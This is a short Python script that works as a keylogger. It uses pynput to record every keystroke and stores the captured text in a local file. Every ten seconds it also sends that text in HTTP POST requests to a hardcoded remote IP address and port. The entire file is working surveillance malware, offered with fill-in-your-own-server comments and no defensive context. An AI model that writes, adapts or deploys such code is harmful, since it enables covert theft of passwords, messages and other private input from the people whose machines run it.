# Import necessary modules
from pynput import keyboard
import requests
import json
import threading

# Global variables
text = ""
ip_address = "109.74.200.23" # your Network IP goes here
port_number = "8080" # your Network Port goes here
time_interval = 10
local_file = "keystrokes.txt"

def write_to_file():
    """Append the collected keystrokes to a local file."""
    with open(local_file, "a") as file:
        file.write(text + "\n")

def send_post_req():
    try:
        payload = json.dumps({"keyboardData": text})
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
        write_to_file()  # Write to local file
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
